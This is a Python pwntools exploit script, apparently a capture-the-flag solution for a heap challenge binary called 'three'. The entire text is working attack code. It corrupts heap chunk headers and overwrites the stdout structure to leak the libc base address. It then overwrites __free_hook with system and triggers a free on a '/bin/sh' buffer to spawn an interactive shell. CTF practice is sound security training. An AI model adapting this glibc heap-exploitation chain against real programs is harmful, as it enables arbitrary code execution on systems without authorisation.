from pwn import *
def cmd(c):
	p.sendlineafter("choice:",str(c))
def add(c="\n"):
	cmd(1)
	p.sendafter("content:",c)
def edit(idx,data):
	cmd(2)
	p.sendlineafter("idx:",str(idx))
	p.sendafter("content:",data)
def free(idx,mode=0):
	cmd(3)
	p.sendlineafter("idx:",str(idx))
	if (mode==0):
		p.sendlineafter("(y/n):",'n')
	else:
		p.sendlineafter("(y/n):",'y')


p=process("./three",env={'LD_PRELOAD':'./libc.so.6'})
libc=ELF("./libc.so.6")
context.log_level='debug'
#init
for x in range(3):
	add(p64(0x21)*8);
free(2,1)
free(1,1)
free(0,1)
#
add()
add()
free(1,1)
free(0)
edit(0,'\x50')
add()

add(p64(0)+p64(0x91))

free(1,1)

for x in range(6):
	free(0)
edit(2,p64(0)+p64(0x51))
free(0)
edit(2,p64(0)+p64(0x91))
free(0,1)

edit(2,p64(0)+p64(0x51)+"\x60\x07\xdd")
add()
add(p64(0xfbad1800)+p64(0)*3+'\x00')

p.read(8)
base=u64(p.read(8))-(0x7ffff7dd18b0-0x00007ffff79e4000)
log.warning(hex(base))
libc.address=base
free(0,1)
edit(2,p64(0)+p64(0x41)+p64(libc.symbols['__free_hook']))
add()
free(0,1)
add(p64(libc.symbols['system']))
edit(2,"/bin/sh\x00")
cmd(3)
p.sendlineafter("idx:",'2')
p.sendline("clear")
p.interactive("nier>>>")
